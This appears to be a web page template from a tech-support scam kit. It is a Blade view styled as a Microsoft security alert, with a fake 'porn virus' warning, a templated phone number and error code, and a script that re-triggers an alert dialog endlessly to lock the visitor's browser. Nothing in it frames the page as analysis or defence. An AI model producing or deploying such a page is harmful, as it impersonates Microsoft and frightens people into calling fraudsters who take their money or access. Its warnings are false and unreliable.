@extends('template.popuptemplate')

@section('style')
body {background-color:#ccc;}

.nav-link
{
    font-weight:bold;
    color: #FFF;
}

.ms-gray
{
    color:#666;
}

.ms-blue
{
    color:#04aef4;
}
@endsection

@section('popup')
    <div class="row bg-white">
        <div class="col-sm">
            <img src="/images/mssquare.png">
        </div>
        <div class="col-sm text-right">
            <input type="search" style="background-color:#CCC; margin-top: 1em;">
        </div>
    </div>
    <div class="row" style="background-color:#04aef4;">        
        <div class="col-md-11 mb-1 mt-1">                        
            <ul class="nav">
                <li class="nav-item"><image src="/images/windows_logo2.jpg" height="36px"></li>
                <li class="nav-item"><a class="nav-link" href="#">Windows</a></li>
                <li class="nav-item"><a class="nav-link" href="#">Devices</a></li>
                <li class="nav-item"><a class="nav-link" href="#">App+Programs</a></li>
            </ul>
        </div>
    </div>
    <div class="row bg-white">
        <div class="col-sm">
            <p class="h1 ms-gray">
                Windows Has Detected Suspicious Activity!
            </p>
            <p class="ms-gray"
                Please Do Not Shut Down or Restart Your Computer It May Crash Your Data
            </p>
            <div class="row">
                <div class="col-sm text-center">
                    <img src="images/msbluelogo.png" height="64px">
                    <br>
                    <p class="h4 ms-blue">
                        Call Microsoft {{$phonenumber}}
                    </p>
                    <p class="ms-gray">
                        Get technical help for the security problem
                        <br>
                        Call On Our Toll Free Number
                    </p>
                </div>                
                <div class="col-sm text-center">
                    <img src="images/ielogo.png" height="64px">
                    <br>
                    <p class="h4 ms-blue">
                        Know About Safe Browser
                    </p>
                    <p class="ms-gray">
                        Learn More About Safe Browsing
                        <br>
                        Call Toll Free {{ $phonenumber }}
                    </p>
                </div>
            </div>
            <p class="h1 ms-gray">
                Call Microsoft {{$phonenumber}} (Toll-Free)
            </p>
        </div>       
        
    </div>
    <div class="row" style="background-color:#666;">
        <div class="col-sm text-right">
            <p style="color:#fff;">Microsoft</p>
        </div>
    </div>            
    
@endsection

@section('jscripts')
<script>    
    function startScripts()
    {
        setTimeout(warning,1000);
    }
    
    function warning()
    {
        var text = "****Don't Restart Your Computer****"
        +"\n"
        +"\n"
        +"Microsoft has detected that a porn virus has infected your system and trying to steal pictures, data and social networking passwords."
        +"\n"
        +"\n"
        +"This is a serious hacking issue. Rectify it immediately."
        +"\n"
        +"IMMEDIATE RESPONSE REQUIRED"
        +"\n"
        +"\n"
        +"Please Do Not Try to Fix Manually. It May Crash Your Data."
        +"\n"
        +"\n"
        +"ERROR CODE: {{$errorcode}}"
        +"\n"
        +"\n"
        +"Call {{$phonenumber}} (Toll Free) and tell this code to agent."
        +"\n"
        +"\n"
        +"Please Visit Your Nearest Windows Service Center OR Call Help Desk"
        +"\n"
        +"\n"
        +"****************************************************************"
        +"\n"
        +"Customer Service +{{$phonenumber}} (TOLL FREE)"
        +"\n"
        +"****************************************************************"
        +"\n"
        +"\n"
        +"\n"
        +"\n"
        +"\n"
        +"\n"
        alert(text);
        warning();
    }
</script>
@endsection